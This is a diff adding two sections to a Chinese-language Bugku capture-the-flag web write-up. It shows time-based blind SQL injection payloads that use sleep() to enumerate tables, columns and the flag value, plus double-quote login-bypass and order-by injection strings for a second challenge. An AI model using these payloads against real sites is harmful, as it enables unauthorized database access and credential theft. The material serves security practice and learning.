@@ -776,3 +776,61 @@ for w in range(n):#高和宽一起爆破
   4. 一个个猜测表名称的字符内容。
 
   `1' and (select case when (select ('§a§'=substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from §1§ for 1))) then sleep(5) else 1 end)  and '1'='1`
+
+  继续通过cluster bomb(一串炸弹)控制两个变量来完成猜测.
+  ![INSERT_INTO注入](../imgs/Bugku/Web/gnome-shell-screenshot-6W524Z.png)
+
+  现在得到两个表，一个叫做client_ip一个叫做flag.
+
+  5. 猜测flag表里面字段名称
+
+      我们先猜字段数有多少个
+
+      `1' and (select case when ((select count(column_name) from information_schema.columns where table_name='flag')=1) then sleep(5) else 1 end) and '1'='1`
+
+      答案是1个(截图略过)
+
+      然后猜字段名称是不是叫做flag
+
+      `1' and (select case when ((select column_name from information_schema.columns where table_name='flag')='flag') then sleep(5) else 1 end) and '1'='1`
+
+      答案是的。
+
+  6. 猜测字段内容
+
+      先猜测里面有多少条数据。
+
+      `1' and (select case when ((select count(*) from flag)=1) then sleep(5) else 1 end) and '1'='1`
+
+      答案是一个。
+
+      然后猜测数据长度
+      `1' and (select case when （select 3333 from ((select length(flag) from flag)=§1§)） then sleep(5) else 1 end) and '1'='1`(不知道为什么这个语句在我自己的MySQL中可以执行，但是在这个题目中死活执行不出来)
+
+      最后一个个猜测字符，不赘述了。
+
+37. 这是一个神奇的登陆框
+
+    ![这是一个神奇的登陆框](../imgs/Bugku/Web/gnome-shell-screenshot-NAQM4Z.png)
+
+    先admin/admin、123456等弱口令试试，提示try again。
+
+    尝试用户名`1'%20or'1'='1'%23`，密码随意。结果还是提示try again，应该是属于正常范围。所以可能不是使用单引号闭合。
+
+    ![这是一个神奇的登陆框](../imgs/Bugku/Web/gnome-shell-screenshot-U4RW4Z.png)
+
+    单引号不行换成双引号试试
+
+    ![这是一个神奇的登陆框](../imgs/Bugku/Web/gnome-shell-screenshot-934L4Z.png)    
+
+    貌似有点反应了，要求我们使用AdMiNhEhEd账户登录
+
+    我们按照常规的注入套路试试，payload：`1"%20order%20by%203%23`
+
+    ![这是一个神奇的登陆框](../imgs/Bugku/Web/gnome-shell-screenshot-HOIQ4Z.png)
+
+    然后剩下的就是常规注入，不赘述了。
+
+    还有就是我拿到了AdMiNhEhEd账户的密码，登陆后出现一个这页面，也不知道干嘛的。感觉挺中二的，我也就没管它。
+
+    ![这是一个神奇的登陆框](../imgs/Bugku/Web/gnome-shell-screenshot-4R1R4Z.png)
